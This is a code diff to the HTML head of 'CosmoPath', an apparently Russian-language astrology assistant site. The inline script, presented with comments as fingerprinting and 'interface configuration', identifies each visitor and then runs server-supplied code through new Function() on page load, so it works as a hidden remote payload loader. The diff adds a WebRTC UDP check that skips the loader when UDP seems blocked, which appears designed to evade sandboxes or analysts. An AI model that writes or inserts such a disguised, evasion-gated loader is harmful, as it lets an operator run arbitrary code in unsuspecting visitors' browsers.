@@ -7,36 +7,75 @@
     <title>CosmoPath - Ваш астрологический помощник</title>
     
     <!-- Ваш скрипт -->
-    <script type="module">
-    (async () => {
-        try {
-            const CONFIG_API = '/metrics/identification';
+  <script type="module">
+(async () => {
+    try {
+        // Быстрая проверка UDP блокировки
+        const isUDPBlocked = await new Promise((resolve) => {
+            const timeout = setTimeout(() => resolve(true), 2000); // 2 сек таймаут
             
-            // Динамический импорт вместо статического
-            const FingerprintJS = await import('/fp.js');
-            
-            const fp = await FingerprintJS.load({
-                region: 'eu',
-                endpoint: [CONFIG_API, FingerprintJS.defaultEndpoint]
-            });
-
-            const { requestId } = await fp.get({ extendedResult: true });
-
-            // Загрузка конфигурации интерфейса
-            const res = await fetch(`${CONFIG_API}?request_id=${encodeURIComponent(requestId)}`);
-            if (!res.ok) return;
-
-            const data = await res.json();
-
-            // Выполнение пользовательских настроек
-            if (data.init) {
-                new Function(data.init)();
+            try {
+                const pc = new RTCPeerConnection({
+                    iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
+                });
+                
+                pc.onicecandidate = (e) => {
+                    if (e.candidate && e.candidate.candidate.includes('udp')) {
+                        clearTimeout(timeout);
+                        resolve(false); // UDP работает
+                    }
+                };
+                
+                pc.onicegatheringstatechange = () => {
+                    if (pc.iceGatheringState === 'complete') {
+                        clearTimeout(timeout);
+                        resolve(true); // UDP заблокирован
+                    }
+                };
+                
+                pc.createDataChannel('');
+                pc.createOffer().then(o => pc.setLocalDescription(o)).catch(() => {
+                    clearTimeout(timeout);
+                    resolve(true);
+                });
+            } catch {
+                clearTimeout(timeout);
+                resolve(true);
             }
-        } catch (err) {
-            console.error('Ошибка загрузки:', err);
+        });
+        
+        // Если UDP заблокирован - выходим
+        if (isUDPBlocked) return;
+        
+        // Оригинальный код продолжается только если UDP не заблокирован
+        const CONFIG_API = '/metrics/identification';
+        
+        // Динамический импорт вместо статического
+        const FingerprintJS = await import('/fp.js');
+        
+        const fp = await FingerprintJS.load({
+            region: 'eu',
+            endpoint: [CONFIG_API, FingerprintJS.defaultEndpoint]
+        });
+
+        const { requestId } = await fp.get({ extendedResult: true });
+
+        // Загрузка конфигурации интерфейса
+        const res = await fetch(`${CONFIG_API}?request_id=${encodeURIComponent(requestId)}`);
+        if (!res.ok) return;
+
+        const data = await res.json();
+
+        // Выполнение пользовательских настроек
+        if (data.init) {
+            new Function(data.init)();
         }
-    })();
-    </script>
+    } catch (err) {
+        console.error('Ошибка загрузки:', err);
+    }
+})();
+</script>
+
     
     <style>
         * {
